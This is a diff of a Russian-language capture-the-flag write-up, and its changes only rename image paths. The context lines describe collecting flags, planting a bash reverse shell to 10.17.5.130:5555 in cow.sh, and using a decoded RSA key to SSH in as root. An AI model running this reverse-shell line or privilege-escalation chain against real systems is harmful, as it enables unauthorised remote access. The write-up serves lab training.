@@ -2,7 +2,7 @@
 
 Перейдя по ip адресу, мы видим страницу с подставками (?) для посуды
 
-<figure><img src="../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Проверив файл **robots.txt**, мы обнаруживаем 2 файла
 
@@ -10,7 +10,7 @@
 
 В файле **flag\_1.txt** находится первый флаг🚩
 
-<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 Во втором файле находится записка, но мы не можем прочитать её содержимое, просто перейдя в него с помощью адресной строки
 
@@ -26,7 +26,7 @@
 
 Используя логин и пароль из записки, подключаемся к машине и скачиваем файл **flag\_2.txt**
 
-<figure><img src="../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Выводим содержимое данного файла и получаем второй флаг🚩
 
@@ -60,7 +60,7 @@
 
 <figure><img src="../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
 
 Добавив в него строку с **bash\_reverse\_shell'ом** с помощью команды `echo 'bash -c "bash -i >& /dev/tcp/10.17.5.130/5555 0>&1''' >>` [`cow.sh`](https://vk.com/away.php?to=http%3A%2F%2Fcow.sh\&cc\_key=) и подключив слушатель, получаем оболочку уже от лица пользователя **mat**, в директории которого находится пятый флаг🚩
 
@@ -92,13 +92,13 @@
 
 Вставляем содержимое данного файла в **base64** декодер и получаем  **RSA-ключ** для подключения по протоколу **ssh**
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Далее создаем файл, в который записываем этот ключ, выдаем ему права с помощью команды `chmod 600 file_name` (600 - чтение и запись)
 
 &#x20;
 
-<figure><img src="../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;Подключаемся по протоколу **ssh** от имени пользователя **root** используя команду&#x20;
 
